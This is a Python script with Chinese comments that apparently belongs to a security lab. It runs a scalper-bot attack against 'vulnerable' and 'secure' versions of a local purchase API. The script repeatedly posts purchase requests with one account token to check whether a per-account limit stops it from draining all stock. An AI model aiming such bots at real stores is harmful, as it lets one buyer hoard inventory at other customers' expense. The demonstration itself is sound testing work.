"""黃牛掃貨攻擊腳本:用單一帳號的機器人狂刷購買,看能一口氣掃走多少庫存。

同一支腳本打 vulnerable 與 secure 兩版,靠掃走的數量證明漏洞是否成立:
- vulnerable:無每人限購 → 一支腳本掃空全部庫存 → 業務流程被濫用。
- secure:每人限購 → 掃到上限就被 429 擋 → 庫存留給其他人。
"""

import requests

from inventory_db import INITIAL_STOCK

SCALPER_TOKEN = "scalper-token"
FAIR_SHARE = 1                       # 單一帳號合理的購買量
MAX_ATTEMPTS = INITIAL_STOCK + 5     # 迴圈上限,避免無限打
REQUEST_TIMEOUT_SECONDS = 5


def run_scalper_attack(base_url):
    """回傳 (是否掃貨成功, 說明字串)。是否掃貨成功=True 代表漏洞成立。"""
    headers = {"Authorization": f"Bearer {SCALPER_TOKEN}"}
    grabbed = 0
    for _ in range(MAX_ATTEMPTS):
        resp = requests.post(
            f"{base_url}/api/purchase",
            headers=headers,
            timeout=REQUEST_TIMEOUT_SECONDS,
        )
        if resp.status_code == 200:
            grabbed += 1
            continue
        break  # 售罄(409)或被限購擋下(429)即停

    if grabbed > FAIR_SHARE:
        return True, f"黃牛用一個帳號掃走 {grabbed}/{INITIAL_STOCK} 台,庫存被清空,一般人買不到"
    return False, f"黃牛只買到 {grabbed} 台(每人限購生效),庫存留給其他人"


if __name__ == "__main__":
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5061"
    abused, message = run_scalper_attack(target)
    print(("[漏洞成立] " if abused else "[已防禦] ") + message)
